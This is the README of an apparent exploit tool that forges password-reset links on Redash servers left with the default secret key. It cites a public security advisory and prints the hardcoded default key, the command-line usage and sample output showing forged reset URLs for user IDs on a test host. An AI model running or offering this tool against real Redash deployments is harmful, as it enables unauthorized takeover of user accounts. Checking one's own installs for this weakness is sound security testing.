# redash-reset

This will use a default `REDASH_SECRET_KEY` key of `c292a0a3aa32397cdb050e233733900f` this allows you to reset the password of the user ID but you will need to know the email address assocaited with it.

Info
---

[https://github.com/getredash/redash/security/advisories/GHSA-g8xr-f424-h2rv](https://github.com/getredash/redash/security/advisories/GHSA-g8xr-f424-h2rv)

Setup
---

```
pip install -r requirements.txt
```

Usage
---

```
usage: redash.py [-h] [-s SECRET] -u URL [-p PROXY]

optional arguments:
  -h, --help            show this help message and exit
  -s SECRET, --secret SECRET
                        Weak REDASH_SECRET_KEY
  -u URL, --url URL     URL of host to check will need http or https
  -p PROXY, --proxy PROXY
                        Proxy for debugging
```

Example
---

```
[2021-11-29T15:44:27Z] rwiggins@MBP-3623:/tmp$ python3 test.py -u http://192.168.1.170
Rest Link http://192.168.1.170/reset/IjEi.YaT1sQ.e6w1vMsG-gx0OVT0qV5aH_aI7IA - UserID: 1

http://192.168.1.170/reset/IjIi.YaT1sQ.j67-OQljn2ivQiyw9Y9wa7G6GY0
Failed to Generate Reset Link for 2
```
